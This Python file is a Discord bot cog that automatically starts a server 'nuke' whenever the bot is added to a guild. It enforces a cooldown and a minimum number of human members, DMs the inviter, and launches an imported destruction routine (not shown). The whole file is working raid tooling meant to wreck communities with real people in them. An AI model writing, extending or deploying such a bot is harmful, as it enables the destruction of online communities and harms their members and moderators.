from __future__ import annotations

import asyncio
import logging
from time import time

import discord
from discord import Guild, User
from discord.ext.commands import Cog

from nuke.config import get as nuke_cfg
from nuke.engine import run_nuke, stop
from utils.db import db

_COOLDOWN_SECONDS = 1800


class nuke(Cog):
    def __init__(self, bot):
        self.bot = bot
        self._tasks: dict[int, asyncio.Task] = {}

    async def _get_inviter(self, guild: Guild) -> User | discord.Member | None:
        try:
            async for entry in guild.audit_logs(
                action=discord.AuditLogAction.bot_add, limit=1
            ):
                if entry.target and entry.target.id == self.bot.user.id:
                    return entry.user
        except discord.Forbidden:
            logging.warning(f"nuke: no audit log access in {guild.name}")
        except Exception as e:
            logging.warning(f"nuke: audit log error: {e}")
        return None

    async def _on_cooldown(self, guild: Guild, retry_ts: float) -> None:
        minutes = max(1, int((retry_ts - time()) / 60))
        who = await self._get_inviter(guild)
        if who and not who.bot:
            try:
                await who.send(
                    f"hey! this server was already nuked. "
                    f"re-add the bot in {minutes} minutes to nuke again.\n\n"
                    f"re-add at: <t:{int(retry_ts)}:F> (`{int(retry_ts)}`)"
                )
            except discord.Forbidden:
                logging.warning(f"nuke cooldown: could not DM {who}")
            except Exception as e:
                logging.warning(f"nuke cooldown: DM error: {e}")
        await guild.leave()

    @Cog.listener()
    async def on_guild_join(self, guild: Guild):
        bcfg = self.bot.cfg
        if guild.id == bcfg.required_server_id:
            return

        persistence = db.persistence
        if persistence:
            last_nuke = await persistence.get(f"nuke:last:{guild.id}", float)
            if last_nuke:
                retry_ts = last_nuke + _COOLDOWN_SECONDS
                if time() < retry_ts:
                    await self._on_cooldown(guild, retry_ts)
                    return

        ncfg = nuke_cfg()
        if ncfg.minimum_members > 0:
            humans = 0
            try:
                async for m in guild.fetch_members(limit=None):
                    if not m.bot:
                        humans += 1
            except discord.Forbidden:
                logging.warning(f"nuke skip: cannot fetch members in {guild.name}")
                humans = guild.member_count or 0
            except Exception as e:
                logging.warning(f"nuke skip: fetch_members error: {e}")
                humans = guild.member_count or 0
            if humans < ncfg.minimum_members:
                who = await self._get_inviter(guild)
                if who and not who.bot:
                    try:
                        await who.send(
                            f"hey! this server doesn't have {ncfg.minimum_members} "
                            f"members to use the bot, please add it to a server "
                            f"with that amount of humans"
                        )
                    except discord.Forbidden:
                        logging.warning(f"nuke skip: could not DM {who}")
                    except Exception as e:
                        logging.warning(f"nuke skip: DM error: {e}")
                await guild.leave()
                return

        if persistence:
            await persistence.set(f"nuke:last:{guild.id}", time())

        logging.info(f"nuke: starting nuke in {guild.name} ({guild.id})")
        task = asyncio.create_task(run_nuke(self.bot, guild.id, guild))
        self._tasks[guild.id] = task

    @Cog.listener()
    async def on_guild_remove(self, guild: Guild):
        await stop(guild.id)
        task = self._tasks.pop(guild.id, None)
        if task:
            task.cancel()


def setup(bot):
    bot.add_cog(nuke(bot))
